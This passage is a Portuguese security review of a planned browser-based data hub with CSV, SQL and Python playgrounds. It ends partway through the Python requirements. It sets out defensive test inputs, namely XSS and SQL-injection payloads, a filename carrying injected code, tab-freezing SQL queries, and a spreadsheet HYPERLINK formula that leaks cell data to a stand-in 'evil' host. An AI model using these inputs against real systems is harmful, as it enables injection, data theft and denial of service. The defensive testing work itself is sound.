# Security Review: Data & AI Community Hub (Fase 1, revisão da arquitetura)

Autor: Security Auditor · Data de referência: 2026-11-12 · Branch `feat/phase-1-planning` · Status: proposta, aguarda leitura do Lucas
Reconciliação: alinhado a `docs/decisions/phase-1-reconciliation.md` (C1 a C10), que vale em caso de divergência. Fases e caminhos seguem C1 e C2 (Fase 2 casca, 3 CSV e SQL, 4 Python, 5 cursos e recursos, 6 PIX, 7 endurecimento e release). Pastas: `hub/ferramentas/csv/`, `hub/ferramentas/sql/`, `hub/privacidade/`, `hub/assets/{css,js,vendor,fonts}/`; `hub/apoie/` é futuro (Fase 6, estrutura definida na fase). MVP = Fases 2 e 3 (C6).

Escopo: arquitetura proposta (`docs/architecture/solution-architecture.md`, `technology-stack.md`, `docs/cost-analysis/infrastructure-costs.md`, `docs/design/hub-ux.md`, `docs/roadmap/prd.md`) e o site atual (`index.html`, `certificacoes.html`, `assets/js/app.js`, `assets/js/i18n.js`, `assets/css/styles.css`). **Não existe código do Hub.** Tudo sobre o Hub é revisão de projeto, não de implementação. Nenhum código foi alterado.

**Rastreio no backlog (L7, C10.5):** os requisitos SR-xx e ST-xx terão tarefa dona do `security-auditor` no backlog (o PM está criando). Nenhum T-xxx é citado aqui até a tarefa existir.

## 0. Como ler este documento

| Etiqueta | Significado |
|---|---|
| **[C]** | Lido no código ou executado no repositório nesta sessão (arquivo e linha, ou comando). |
| **[V]** | Verificado nesta sessão em URL **primária** lida (citada). Espelhos de terceiros ou API não reproduzida valem [S] (C8). |
| **[S]** | Suposição ou conhecimento geral não verificado nesta sessão. Precisa de teste ou confirmação. |
| **NÃO VERIFICADO** | Eu tentei ou deveria verificar e não consegui. Não tratar como fato. |

Escala usada nos riscos:

- Severidade: **Crítica** (comprometimento de dados do usuário ou da conta do Lucas sem ação do usuário), **Alta** (exfiltração ou fraude plausível com uma ação comum do usuário), **Média**, **Baixa**.
- Probabilidade: **Alta**, **Média**, **Baixa**, avaliada para o Hub depois de implementado como descrito, sem as mitigações.
- Estado: **Aberto** (nada feito), **Aberto, aguarda Lucas** (exige decisão ou aprovação), **Mitigado no projeto, a verificar** (a mitigação existe no desenho, mas não há código para testar), **Verificado** (confirmado no código atual).

Não identifiquei nenhum risco **Crítico** no estado atual. Não há código do Hub, nenhum segredo foi encontrado e o site atual não processa dados de usuário. Os riscos Altos abaixo passam a ser reais assim que as ferramentas forem implementadas.

### Limitações desta sessão (o que NÃO foi verificado)

Rodada de reconciliação (2026-11-12), nova tentativa em fontes primárias (C8):

1. **Termos formais do GitHub Pages.** A página de limites (`docs.github.com/.../github-pages-limits`) foi lida só por ferramenta que resume a página, sem trecho citado; a releitura direta foi barrada (HTTP 403 do proxy). Vale [S] (C10.5 N6; seção 8.1). **NÃO VERIFICADO.** A página "GitHub Terms for Additional Products and Features", fonte contratual, **não foi lida**: a requisição foi barrada por falta de resposta de aprovação de permissão. **NÃO VERIFICADO.**
2. **Documentação do Pyodide** (`pyodide.org`: rede em Worker, CSP, `micropip`): requisição barrada pelo mesmo motivo. Nenhuma afirmação técnica sobre Pyodide abaixo foi confirmada. **NÃO VERIFICADO.**
3. **Advisories de sql.js e Papa Parse** (GitHub Security Advisories): requisição barrada. npm audit e OSV não consultados. Pyodide também não. **NÃO VERIFICADO.** Não afirmo que as versões propostas sejam livres de vulnerabilidades.
4. **Versões e licenças** de sql.js, Papa Parse, Pyodide, DuckDB-WASM e das fontes: `LICENSE` e registro oficial não lidos nesta sessão. Versões citadas em outros documentos (1.15.0, 5.7.1, 314.x) vêm de API ou espelho de terceiros e valem como [S], não [V] (C8). **NÃO VERIFICADO** (mesma pendência P2 do Architect). Licenças citadas abaixo como "suposta" são suposição.
5. **Comportamento real do GitHub Pages** (cabeçalhos, CORS em arquivos estáticos, compressão, herança de CSP por Workers): nenhum teste com site publicado. **NÃO VERIFICADO.**
6. **Ferramenta de varredura de segredos dedicada** (gitleaks, trufflehog) não foi executada. A busca da seção 9 é um `grep` simples.
7. **Parecer jurídico** (LGPD, GDPR, fiscal sobre PIX): não é escopo nem competência desta revisão.

---

## 1. Resumo executivo

| Prioridade | Tema | Em uma frase |
|---|---|---|
| Alta | Python com acesso à rede (SEC-01) | Código Python enviado por terceiros pode ler o CSV carregado e enviá-lo para fora com `pyfetch`. A CSP via `<meta>` pode não alcançar o Worker (suposição a testar). |
| Alta | XSS ao renderizar dados do usuário (SEC-02, SEC-03) | O `i18n.js` atual reescreve `innerHTML` de todo elemento `data-i`; dado do usuário nunca pode ficar dentro de um. Células, cabeçalhos e saída de Python/SQL só com `textContent`. |
| Alta | Injeção em SQL gerado a partir do CSV (SEC-04) | Nomes de coluna do CSV viram identificadores SQL (RF-08). Sem citar identificadores, é injeção de SQL e de código Python. |
| Alta | PIX: troca de chave por adulteração ou clone (SEC-12, SEC-13) | Sem backend não há checagem em tempo de execução. A defesa é controle de acesso ao repositório e checklist de release. |
| Média | Integridade das bibliotecas (SEC-08), CSV injection (SEC-05), travamento (SEC-06, SEC-07), origem compartilhada (SEC-10), Google Fonts (SEC-14), analytics (SEC-15) | Detalhados abaixo. |
| Verificado limpo | Segredos (SEC-17) | Nenhum padrão de chave ou token no repositório atual nem no histórico de 2 commits (seção 9). |

---

## 2. Registro de riscos

Dono: papéis do projeto (`.claude/agents/`). "Lucas" significa decisão ou aprovação humana.

| ID | Descrição | Sev. | Prob. | Mitigação (resumo; detalhe na seção indicada) | Dono | Estado |
|---|---|---|---|---|---|---|
| SEC-01 | Python playground: código de terceiros (colado de um tutorial, de um "exercício" ou de um link compartilhado) acessa a rede via `pyodide.http.pyfetch`, `urllib`, `js.fetch`, `js.WebSocket` ou instala pacotes com `micropip`, e exfiltra o CSV carregado ou executa código de PyPI. | Alta | Média | CSP `connect-src 'self'` e teste de que alcança o Worker; se não alcançar, Worker em blob ou iframe sandbox; sem `micropip`; lista fechada de pacotes autohospedados; início só por clique; aviso explícito. Seção 4. | Solution Architect, Frontend Developer, QA | Aberto |
| SEC-02 | XSS ao renderizar dados do usuário (células de CSV, nomes de coluna, resultado SQL, stdout/stderr/traceback de Python, mensagens de erro do motor, nome do arquivo). Origem compartilhada com os demais sites da conta (SEC-10) amplia o impacto. | Alta | Média | `textContent` / `createTextNode` / `setAttribute` apenas; proibir `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` com dado do usuário; CSP; teste com payloads. Seção 2.1. | Frontend Developer, QA | Aberto |
| SEC-03 | O `i18n.js` atual faz `el.innerHTML = ...` em todo `[data-i]` a cada troca de idioma e guarda o `innerHTML` original em `data-en` na primeira execução. Conteúdo do usuário dentro (ou como filho) de um elemento `data-i` é reinterpretado como HTML e apagado na troca de idioma. | Alta | Média | Regra de projeto: elementos `data-i` contêm apenas texto estático do desenvolvedor; áreas de dados do usuário ficam fora de `data-i`; `PT_EXTRA` e `ht()` só aceitam strings estáticas. Revisão de código e teste com troca PT/EN durante exibição de dados. Seção 2.2. | Frontend Developer, QA | Verificado (comportamento do `i18n.js`); regra de uso aberta |
| SEC-04 | Injeção em SQL ou Python gerados a partir de dados do usuário: nome de tabela e de coluna do CSV (RF-08) montados com concatenação; nome do arquivo interpolado em código Python (RF-12). | Alta | Média | Citar identificadores (`"` com `""`), valores só por parâmetro; nomes internos fixos (`t1`, `col_1`) com mapa para o rótulo original; nunca interpolar nome de arquivo em código; escrever o arquivo no sistema de arquivos do Pyodide com nome fixo. Seção 2.3. | Frontend Developer, QA | Aberto |
| SEC-05 | CSV injection (formula injection) na exportação (RF-10, hub-ux 5.2): células iniciadas por `=`, `+`, `-`, `@`, TAB ou CR executam fórmulas ao abrir no Excel. | Média | Média | Neutralizar na exportação; opção de configuração; teste. Seção 2.4. | Frontend Developer, QA | Aberto |
| SEC-06 | SQL playground: consulta que não termina (`WITH RECURSIVE` sem condição), produto cartesiano ou `randomblob`/`zeroblob` gigante trava ou derruba o Worker/aba; resultado enorme travam a renderização. | Média | Alta | **MVP (C10.1):** SQL em Worker; timeout e botão Parar por término do Worker; leitura de linhas com limite (não `db.exec` completo); teto de linhas exibidas; tratamento de falha de memória. Seção 3. | Frontend Developer, QA | Mitigado no projeto, a verificar |
| SEC-07 | CSV ou SQLite grande demais esgota memória do navegador (C6: **critério do MVP = 10 MB**; 50 MB é meta a medir, não critério). | Média | Média | Limite de 10 MB verificado por `File.size` antes de ler; limite em linhas; leitura em Worker com término por timeout/Parar (**MVP, P0**, C10.1); testes em notebook modesto e celular. Subir o limite só após medição. Seção 2.5. | Frontend Developer, QA | Mitigado no projeto, a verificar |
| SEC-08 | Cadeia de suprimentos: binários e scripts de terceiros (WASM, Pyodide) commitados sem prova de origem; versão errada; arquivo adulterado no repositório ou no download; vulnerabilidade conhecida não detectada; licença incompatível. | Média | Média | `hub/assets/vendor/manifest.json` com origem, versão, SHA-256, licença; hash conferido no carregamento; consulta de advisories antes de cada versão; download pelo registro oficial com checagem cruzada. Seção 5. | Solution Architect, Tech Lead, Lucas (aprova) | Aberto; licenças e advisories NÃO VERIFICADOS |
| SEC-09 | CDN com versão não fixada ou sem SRI (se D3 virar exceção de CDN, sobretudo para Pyodide). | Média | Baixa (hoje não há CDN) | Autohospedar (padrão); se houver exceção, versão exata, `integrity` e `crossorigin`, aprovação do Lucas. Seção 5.3. | Lucas (decide), Solution Architect | Aberto, aguarda Lucas |
| SEC-10 | `localStorage` e demais armazenamentos são da **origem** `luudelfino91-lgtm.github.io`, compartilhada com qualquer outro site de projeto da conta [S]. Uma falha em qualquer página da origem lê ou grava as chaves `ld-*` e `hub-*`. **MVP (C6):** só `ld-lang`, `ld-theme` (existentes) e o que o Hub realmente precisar, validado. Rascunho de código, convite dispensável e progresso de curso são P2: **adiado, reavaliar quando formalizado** (o risco de dado sensível colado em rascunho passa a existir só então). | Média | Baixa | MVP: nunca guardar dado pessoal nem conteúdo de arquivo; validar tudo que for lido (lista de valores, `try/catch`). Ao formalizar funções P2: aviso, botão "Limpar", limite de tamanho, reavaliar iframe sandbox. Seção 6. | Frontend Developer, Technical Writer (texto de privacidade) | Aberto (MVP); P2 adiado |
| SEC-11 | CSP só via `<meta>` no GitHub Pages (sem cabeçalhos): proteção parcial; as páginas atuais usam `<script>` inline, `onclick` inline e `style=""`, o que impede uma política estrita no portfólio sem editá-lo. | Média | Certa | CSP por `<meta>` apenas nas páginas do Hub; sem inline no Hub; entender os limites. Seção 7. | Solution Architect, Frontend Developer | Aberto |
| SEC-12 | PIX: a chave exposta no repositório e na página identifica o Lucas (dados pessoais, histórico do Git é permanente); nome e cidade do recebedor também aparecem no payload [S]. | Média | Certa (a chave será pública) | **Provisório até a Fase 6 (D5 pendente).** Se D5 for aprovado: chave aleatória (EVP), decisão do Lucas **antes** do primeiro commit com chave; nunca CPF, telefone ou e-mail se o Lucas não aceitar torná-los públicos. Seção 8. | Lucas (decide) | Aberto, aguarda Lucas |
| SEC-13 | PIX: troca da chave ou do QR por terceiros (conta do GitHub comprometida, PR malicioso, dependência comprometida) ou clone do site com outra chave. Sem backend, ninguém detecta a troca em tempo de execução. | Alta | Baixa a Média | 2FA/passkey; proteção do `main`; PR obrigatório; CODEOWNERS; payload estático pré-gerado e validado (CRC16); chave pinada em documento fora do código e verificada no release (se D5 aprovado); chave publicada em segundo canal (LinkedIn/GitHub README); sem gerador de QR de terceiros. Seção 8. | Lucas, QA, Tech Lead | Aberto, aguarda Lucas |
| SEC-14 | Google Fonts em `index.html` linhas 26-28 e `certificacoes.html` linhas 22-24 [C]: cada visita envia o IP do visitante (e User-Agent, Referer) ao Google [S]. O público do portfólio inclui a União Europeia (vagas na Irlanda). | Média | Certa (acontece em toda visita) | Autohospedar as fontes (já previsto para o Hub); no portfólio, só com aprovação. Seção 10. | Lucas (aprova, altera portfólio) | Aberto, aguarda Lucas |
| SEC-15 | Analytics: qualquer ferramenta é serviço externo, coleta IP e metadados (dado pessoal na LGPD e no GDPR [S]) e quebra RNF-02/RNF-03 se mal escolhida. | Média | Baixa (nenhum previsto) | Recomendação: **sem analytics**; alternativas na seção 11, decisão do Lucas. | Lucas (decide) | Aberto, aguarda Lucas |
| SEC-16 | Downloads de recursos (RF-14): arquivos Office com macro, metadados com dado pessoal ou da empresa do Lucas, datasets com dados reais de clientes (domínio de crédito e cobrança). | Média | Média | Datasets só sintéticos ou de licença pública; sem `.xlsm`/`.pbix` com dado real; limpar metadados; SHA-256 ao lado do download. Seção 12. | Product Manager, Technical Writer, QA | Aberto |
| SEC-17 | Segredo no repositório. | Baixa | Baixa | `grep` por padrões: **nenhum achado** no working tree e no histórico (2 commits). Seção 9. | Security Auditor | Verificado limpo (escopo da busca limitado) |
| SEC-18 | Links, vídeos e conteúdo externo curado (RF-13, RF-15, hub-ux 5.5-5.6): domínio expirado sequestrado, link para phishing, iframe de vídeo que envia IP a terceiros e relaxa a CSP. | Média | Média | `rel="noopener noreferrer"`; revisão periódica de links; vídeo só por clique, com aprovação do Lucas e CSP `frame-src` restrita à página; sem iframes antes do clique. Seção 12. | Product Manager, QA | Aberto, aguarda Lucas |
| SEC-19 | Service Worker opcional (Fase 7, opcional): cache de versão antiga de WASM vulnerável; em caso de XSS, persiste código malicioso. | Baixa | Baixa | Escopo limitado a `hub/`; nome de cache com versão; limpeza no ativar; só se necessário. | Frontend Developer | Aberto |
| SEC-20 | Clickjacking: Pages não envia `X-Frame-Options` e `frame-ancestors` não funciona em `<meta>` [S]. A página PIX pode ser embutida em site de terceiros. | Baixa | Baixa | Aceitar e documentar; a página PIX mostra nome e instituição do recebedor para conferência. | Solution Architect | Aceito proposto, aguarda Lucas |
| SEC-21 | Conflito entre regra "sem execução de código em servidor" e o laboratório Python/SQL: o código roda no cliente. | Baixa | n/a | Interpretação adotada: a regra é cumprida porque nada é executado em servidor; execução no navegador do próprio usuário é permitida, mas isolada em Worker (seção 4). Confirmar com Lucas. | Lucas | Aberto, aguarda Lucas |

### 2.1 SEC-02: renderização de dados do usuário (XSS)

**O que existe hoje [C].** O site atual escapa corretamente: `esc()` em `app.js` linha 3 e uso consistente nos templates de `projectCard`, `renderCase`, `renderHome`. A rota por hash só aceita `[\w-]+` (`app.js` linha 131). Limitações do `esc()` que o Hub **não** deve herdar como método: não escapa o apóstrofo `'` (só serve para atributos entre aspas duplas) e `data-slug="${p.slug}"` (linhas 52 e 106) não passa por `esc()` (dado estático do desenvolvedor, risco baixo hoje). Todos os templates do portfólio têm origem em `data.js`, escrito pelo Lucas, não em dados de usuário.

**Para o Hub, dado do usuário é qualquer coisa vinda de arquivo, editor, resultado de motor ou URL.** Isso inclui: nome do arquivo, cabeçalhos, células, mensagens de erro do SQLite (podem repetir texto da consulta e nomes de coluna), stdout e traceback do Python (podem conter qualquer texto), valor de `location.hash` e `location.search`.

**Requisitos (a verificar por QA e Developer):**

1. Inserir texto sempre com `node.textContent = valor` ou `document.createTextNode(valor)`. Nunca `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `DOMParser` + inserção, nem template literal com dado do usuário dentro de HTML.
2. Atributos com dado do usuário (`title` de célula truncada, `aria-label`, `download`) só com `setAttribute` ou propriedade DOM, nunca por concatenação em string de HTML. Nunca `href`, `src` ou `srcdoc` com valor do usuário. Se uma célula tiver URL, mostrar como texto, sem link.
3. Montar a tabela com `createElement` por célula (ou `DocumentFragment`), não com `join()` de strings. Para tabelas grandes, virtualizar e criar só as linhas visíveis.
4. Saída do Python e traceback em `<pre>` com `textContent`. Nada de converter ANSI ou Markdown para HTML sem sanitizador; se for necessário colorir, criar `<span>` por trecho com `textContent`.
5. `eval`, `new Function`, `setTimeout("string")` e `Function(...)` proibidos no código do Hub. Isso também é condição para uma CSP sem `unsafe-eval` (seção 7).
6. Valores de `location.hash` só são usados como chave de uma lista fechada (ex.: `#ex=join-basico` procura `join-basico` em uma tabela de exercícios). **Nunca** carregar código SQL ou Python vindo de URL; se for implementado link compartilhável, o código carregado não executa sozinho e a interface avisa antes de rodar.
7. Cabeçalhos de CSV como chaves de objeto: `__proto__`, `constructor` e `prototype` são chaves perigosas (poluição de protótipo) [S]. Usar arrays de arrays (já é o formato do contrato `RunResult.rows`) ou `Map`/`Object.create(null)`. Tratar cabeçalhos duplicados e vazios.
8. Teste de aceitação: carregar um CSV cujas células e cabeçalhos contenham `<img src=x onerror=alert(1)>`, `"><svg onload=alert(1)>`, `</script><script>alert(1)</script>`, `javascript:alert(1)` e `__proto__`; executar SQL `SELECT '<img src=x onerror=alert(1)>' AS "<b>x</b>"`; executar Python `print("<img src=x onerror=alert(1)>")` e `raise Exception("<script>alert(1)</script>")`. Em todos, nenhum alerta e o texto aparece literalmente. Repetir trocando PT/EN com os dados na tela.

### 2.2 SEC-03: comportamento do `i18n.js` [C]

`i18n.js` linhas 109-113: para cada `[data-i]`, guarda `el.innerHTML` em `data-en` na primeira execução e depois atribui `el.innerHTML` (tradução PT ou o EN guardado) em **toda** troca de idioma. Consequências para o Hub:

- Se um elemento `data-i` tiver dado do usuário dentro dele, na primeira execução o conteúdo é lido como HTML (`innerHTML` serializa e reparseia) e depois é reinserido como HTML. Serialização e reparse não preservam sempre o mesmo DOM (mutação de HTML), e é um vetor clássico de XSS por mutação [S]. Além disso, o conteúdo dinâmico seria apagado na troca de idioma.
- O dicionário `PT` e o `PT_EXTRA` são inseridos como HTML por definição (têm `<span class="grad">`). Portanto **toda chave de dicionário é código confiável**. Nada vindo de JSON de conteúdo editável por terceiros, de URL ou do usuário pode entrar no dicionário.
- `data-ia` define atributos por `setAttribute` (seguro), mas o valor também vem do dicionário confiável.

**Requisitos:** (a) elemento `data-i` só contém texto estático escrito pelo desenvolvedor; (b) contêineres de resultado (`#result`, `#console`, tabelas) nunca têm `data-i` nem descendem de um; (c) strings dinâmicas do Hub usam `ht()` com dicionário próprio e inserção por `textContent`; (d) `ht(key, vars)` não pode inserir `vars` como HTML. O `i18n.js` do portfólio não deve ser editado (D4); a regra vale para quem usa o gancho.

### 2.3 SEC-04: identificadores e nomes de arquivo

- RF-08 carrega o CSV como tabela. Se o código fizer `CREATE TABLE ${nome} (${colunas.join(",")})` com texto do CSV, um cabeçalho como `a); DROP TABLE x; --` vira SQL. No sql.js o dano fica no banco em memória, mas o mesmo padrão em outras camadas (Python, exportação) é perigoso, e o resultado é confusão e perda do trabalho do usuário.
- **Requisito:** (1) nomes de tabela e coluna internos gerados pelo Hub (`data`, `c1`, `c2`...), com mapa para o rótulo original mostrado na interface; ou, se os nomes originais forem usados (melhor para ensino), citar com aspas duplas e dobrar `"` internas; (2) valores inseridos com `stmt.bind` / `INSERT ... VALUES (?, ?)` em uma transação, nunca por concatenação; (3) tamanho máximo de identificador e de número de colunas (limite do SQLite padrão é 2000 colunas [S]); (4) rejeitar ou renomear cabeçalhos vazios e duplicados.
- Python (RF-12): gravar os bytes do arquivo em `/data/input.csv` no sistema de arquivos do Pyodide (nome fixo) e não gerar código com o nome do arquivo do usuário. Código de exemplo que o Hub gera usa só o nome fixo.
- Teste: arquivo cujo nome seja `a"; print(1)#.csv` e cabeçalhos `x" INTEGER); DROP TABLE data; --`; a ferramenta carrega sem executar nada extra.

### 2.4 SEC-05: CSV injection na exportação

- Ameaça: o usuário exporta o resultado e abre no Excel ou LibreOffice. Uma célula como `=HYPERLINK("http://evil/?"&A1,"clique")` ou `=cmd|...` pode vazar dados ou executar comandos (OWASP "CSV Injection") [S, descrito em guias OWASP, não consultado aqui]. O dado malicioso pode ter vindo do CSV de terceiros que o usuário carregou.
- Mitigação: ao exportar, para cada célula **de texto** cujo primeiro caractere seja `=`, `+`, `-`, `@`, TAB (`0x09`) ou CR (`0x0D`), prefixar um apóstrofo `'` (ou aspas e espaço), conforme padrão adotado, e escapar aspas pelo CSV (RFC 4180). Não aplicar a células numéricas reais (por exemplo `-12.5` em coluna numérica) para não corromper números; a regra depende do tipo da coluna inferido e deve ser descrita na interface.
- Papa Parse oferece, segundo meu conhecimento, a opção `escapeFormulae` em `unparse` [S, **NÃO VERIFICADO** na versão 5.7.1; confirmar lendo `papaparse.js` ao baixá-lo]. Se for usada, testar o comportamento exato; se não existir, implementar função própria pequena.
- Oferecer na interface: "Exportar como está" (com aviso) e "Exportar protegido contra fórmulas" (padrão). Avisar que valores protegidos ganham um apóstrofo no início.
- Gerar o arquivo com `Blob` e `URL.createObjectURL`, liberar com `URL.revokeObjectURL`, e sanitizar o nome sugerido em `download` (sem `/`, `\`, caracteres de controle; limitar o tamanho). BOM UTF-8 só se a interface oferecer (compatibilidade com Excel); é um detalhe, não de segurança.
- Teste: CSV com `=1+1`, `+cmd`, `-2+3`, `@SUM(A1)`, `\t=1`, `\r=1`; exportar; abrir em Excel e LibreOffice; nenhuma fórmula calculada.

### 2.5 SEC-07 e processamento de arquivos enviados

Não há upload a servidor (nenhum backend). O "arquivo enviado" é lido localmente com `File`/`FileReader`/Papa Parse. Requisitos:

1. **Tamanho primeiro.** Verificar `file.size` antes de ler. Conforme C6, o critério do MVP é **10 MB**; 50 MB é meta a validar por medição. Um CSV grande vira muitas vezes seu tamanho em objetos JS e mais ainda quando copiado para o banco [S]. Subir acima de 10 MB só depois de medir (memória, tempo de resposta em máquina de referência). Acima do limite: mensagem e opção "primeiras N linhas" (já em hub-ux 5.2).
2. **Não confiar em extensão nem em `file.type`.** Validar pelo conteúdo: texto, delimitador plausível, tamanho de linha máximo, número máximo de colunas e de linhas. Binários renomeados como `.csv` devem falhar com mensagem, sem travar.
3. **Parsing em Worker** (`worker: true` do Papa Parse, [S] a confirmar) com cancelamento; **MVP, P0** (C10.1, substitui o P1 anterior). O limite de 10 MB e o de linhas continuam como defesa adicional, não como substituto do Worker.
4. **Codificação:** detectar UTF-8/UTF-16/Windows-1252 com opção manual; não executar nada com o texto.
5. **Limites de renderização:** mostrar no máximo N linhas (por exemplo 1.000) com virtualização; nunca criar milhões de nós DOM.
6. **Nenhuma cópia para fora:** nenhum `fetch`, `XMLHttpRequest`, `sendBeacon`, `WebSocket`, `postMessage` a outra origem, nem imagem de rastreio com dados do arquivo. Verificação: aba Network vazia durante o uso (já é o critério do PRD RNF-02) e CSP `connect-src 'self'`.
7. **SQLite enviado pelo usuário** (se o importar `.sqlite` ficar no escopo): abrir só em Worker; validar cabeçalho "SQLite format 3\0"; limite de tamanho; `PRAGMA trusted_schema=OFF` para impedir que views e triggers chamem funções não confiáveis [S, **NÃO VERIFICADO** no sql.js 1.15.0]. Um arquivo mal formado pode derrubar o Worker; tratar como falha recuperável.
8. **XLSX:** não está no escopo da v1. Se entrar, a biblioteca de leitura é uma superfície nova (bibliotecas de planilha tiveram avisos de segurança no passado [S, **NÃO VERIFICADO**]); passar pelo gate da seção 5 antes.
9. **Dados do exemplo do próprio Hub:** só sintéticos (SEC-16).

---

## 3. SQL playground (sql.js)

**Modelo de ameaça.** O SQLite do sql.js roda dentro do WASM, em memória, sem rede e sem acesso ao disco do usuário [S: é o que o projeto faz; **NÃO VERIFICADO** nesta sessão]. A SQL escrita pelo próprio usuário só pode afetar o banco em memória e a aba. O risco principal é **negação de serviço** (travar a aba, perder o trabalho) e **SQL de terceiros** colada sem entender. Não há "escalada" para o servidor, porque não existe servidor.

**Fatos e suposições:**

- [C] A arquitetura propõe sql.js em Worker e timeout por término do Worker (`solution-architecture.md` seções 3.3 e 7).
- [S] O SQLite roda de forma síncrona dentro do Worker; não há como interromper uma consulta em andamento sem `SharedArrayBuffer`/interrupção. Por isso `worker.terminate()` é o único corte confiável (concorda com o desenho). O estado do banco em memória é perdido ao terminar; a interface já prevê isso para o Python e deve prever igual para o SQL.
- [S] O sql.js distribuído normalmente **não** inclui `load_extension` (extensões nativas não existem no WASM). Confirmar no arquivo `sql-wasm.js`/documentação do projeto na hora de baixá-lo. **NÃO VERIFICADO.**
- [S] Funções como `randomblob(N)` e `zeroblob(N)` podem alocar muita memória; o SQLite tem um limite de tamanho por valor (padrão cerca de 1 GB) que, no WASM, tende a estourar a memória do Worker antes. `WITH RECURSIVE` sem fim e junções cartesianas ocupam CPU indefinidamente.

**Requisitos de projeto:**

1. **Worker obrigatório**, nunca no thread principal. A interface permanece responsiva e o botão "Parar" fica ativo (hub-ux 5.3 prevê "Parar" após 3 s).
2. **Timeout padrão** (por exemplo 10 s, configurável, com máximo) que termina e recria o Worker, avisa "Banco reiniciado. Suas tabelas foram perdidas, o seu código não" e recarrega os dados do dataset de exemplo. Recarregar um CSV do usuário exige que o `File` fique guardado na página (referência ao objeto `File`, não cópia em armazenamento persistente).
3. **Limite de linhas do resultado** no Worker: executar com `db.prepare()` e `stmt.step()` em laço, parando em N linhas (por exemplo 10.000) e informando "resultado truncado". Evitar `db.exec()` sem limite, que materializa tudo em memória.
4. **Falha de memória:** capturar `RangeError`/`abort` e mensagem de erro do Worker (`worker.onerror`, `unhandledrejection`) e transformar em erro recuperável com botão de reinício.
5. **Funções e comandos perigosos.** Em ordem de eficácia: (a) o ambiente é descartável e local, então o impacto é limitado; (b) desativar o que existir no build escolhido (extensões, `fts` etc. só se não forem necessárias); (c) pré-filtro textual de `ATTACH`, `VACUUM INTO`, `PRAGMA` (lista de PRAGMAs permitidos para ensino, como `table_info`) e `writable_schema` — **filtro textual é contornável** (comentários, maiúsculas, Unicode); tratá-lo como aviso de UX, nunca como barreira de segurança. (d) Se o sql.js expuser um autorizador (`sqlite3_set_authorizer`), é a forma correta; **NÃO VERIFICADO** que o sql.js 1.15.0 o expõe. `ATTACH` só cria arquivos no sistema de arquivos virtual em memória; não alcança o disco do usuário [S].
6. **Dados de exercício verificáveis** (RF-09, "verificação de resposta"): comparar o resultado do usuário com o esperado em código do Hub; o gabarito não deve estar no HTML em texto que facilite XSS (não é de segurança, mas o gabarito em JSON deve ser tratado como dado, nunca avaliado).
7. **Sem gravação automática** de consultas em armazenamento persistente no MVP. Rascunho de código é P2 (C6): adiado, reavaliar quando formalizado (aviso da seção 6 vale então).

**Testes para o QA:** `WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c) SELECT count(*) FROM c;` deve ser interrompida em no máximo o timeout configurado e a página continua responsiva; `SELECT length(zeroblob(2000000000));` e `SELECT randomblob(900000000);` não podem congelar a aba; junção cartesiana de uma tabela de 100.000 linhas consigo mesma; erro de SQL repetido 200 vezes não vaza memória visível; trocar de aba e voltar após reinício.

---

## 4. Python playground (Pyodide)

**Modelo de ameaça.** O código Python roda no navegador do usuário. Esse código **não é confiável** quando vem de terceiros (tutoriais, "exercícios", colegas, links). Se ele puder acessar a rede, pode ler qualquer CSV carregado no sistema de arquivos virtual e enviá-lo para fora: isso quebra diretamente a regra "nenhum dataset enviado a terceiros sem consentimento". É o risco mais sério do projeto (SEC-01).

**O que NÃO foi verificado (documentação do Pyodide não lida):** os itens abaixo marcados [S] vêm de conhecimento geral. A Fase 4 deve confirmá-los na documentação da versão fixada e por teste.

**Caminhos de rede disponíveis ao código do usuário [S]:**

| Caminho | Observação |
|---|---|
| `pyodide.http.pyfetch(url)` e `pyodide.http.open_url` | usam o `fetch`/XHR do navegador |
| `import js; js.fetch(...)`, `js.XMLHttpRequest`, `js.WebSocket`, `js.EventSource`, `js.importScripts` | o módulo `js` dá acesso a todo o escopo global do Worker |
| `import(url)` dinâmico e criação de Worker aninhado a partir de `js` | **não é possível bloquear apagando globais**; um Worker novo nasce com globais limpas |
| `micropip.install(...)` | baixa pacotes de PyPI e de URLs; executa código de terceiros (cadeia de suprimentos) |
| `pyodide.loadPackage(...)` | baixa do local indicado em `indexURL` (autohospedado se configurado assim) |
| `urllib`, `requests` etc. | se patchados para o navegador, caem nos casos acima |

**Consequência:** bloquear a rede por "desativar funções em JavaScript" é **defesa em profundidade, não barreira**. A barreira só pode ser a política do navegador.

**Estratégias, da mais forte à mais fraca (decisão do Solution Architect e do Lucas; protótipo na Fase 4):**

- **A. `connect-src 'self'` por CSP e prova de que alcança o Worker.** Pelo conhecimento geral das especificações, um Worker criado de uma URL `https:` recebe a CSP dos **cabeçalhos da resposta do script do Worker**, e não da `<meta>` da página [S, **NÃO VERIFICADO**]. No GitHub Pages não há cabeçalhos próprios. Se isso for verdade, uma CSP via `<meta>` **não restringe** um Worker carregado de arquivo `.js` do mesmo site. Workers criados a partir de URL `blob:` ou `data:` herdam a CSP do criador [S]. Portanto, o desenho candidato é criar o Worker a partir de um `Blob` com o texto do script (carregado por `fetch` com verificação de hash) e testar na prática que `pyfetch('https://exemplo.invalid/')` falha com erro de CSP. Sem esse teste, não afirmar que a rede está bloqueada.
- **B. iframe com `sandbox="allow-scripts"` (sem `allow-same-origin`) e `srcdoc` com sua própria `<meta>` CSP restritiva** (`default-src 'none'`; `connect-src 'none'` ou limitada; `worker-src blob:`; `script-src 'wasm-unsafe-eval' blob:` etc.). Vantagens: origem opaca (sem acesso ao `localStorage`, IndexedDB e cookies da origem real; reduz SEC-10) e política própria independente da página. Custos: comunicação por `postMessage`; o Pyodide precisa dos arquivos do WASM, que o pai pode buscar e entregar como `ArrayBuffer`/`Blob` [S]; complexidade de implementação **não avaliada**. Recomendo prototipar B se A falhar no teste.
- **C. Neutralizar `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `importScripts` no escopo do Worker antes de iniciar o Python** e **avisar na interface** que o bloqueio não é total. Esta é a camada mais fraca (contornável por `import()` e Worker aninhado) e **não pode ser vendida como bloqueio**.

**Requisitos de projeto para Python (a verificar):**

1. Python só executa em Worker de módulo, iniciado por clique ("Carregar ambiente"), com tamanho informado (já em hub-ux 5.4).
